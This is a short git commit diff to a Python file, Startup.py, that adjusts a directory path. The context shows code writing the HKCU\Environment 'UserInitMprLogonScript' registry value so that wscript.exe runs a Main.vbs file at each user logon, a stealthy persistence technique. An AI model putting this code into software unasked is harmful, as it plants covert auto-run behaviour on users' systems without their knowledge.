6662955c6a32ecd4c33bb22b752354b29645458c
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-06 12:28:53 +0300

    Update Startup.py

--- Startup.py
+++ Startup.py
@@ -5,7 +5,7 @@ class Startup():
 		self.Main()
 
 	def Main(self):
-		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-2])
+		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-1])
 		root_key=OpenKey(HKEY_CURRENT_USER, r'Environment', 0, KEY_WRITE)
 		SetValueEx(root_key,"UserInitMprLogonScript",0,REG_SZ,"wscript.exe " + dirname + "\\Main.vbs")
 		CloseKey(root_key)
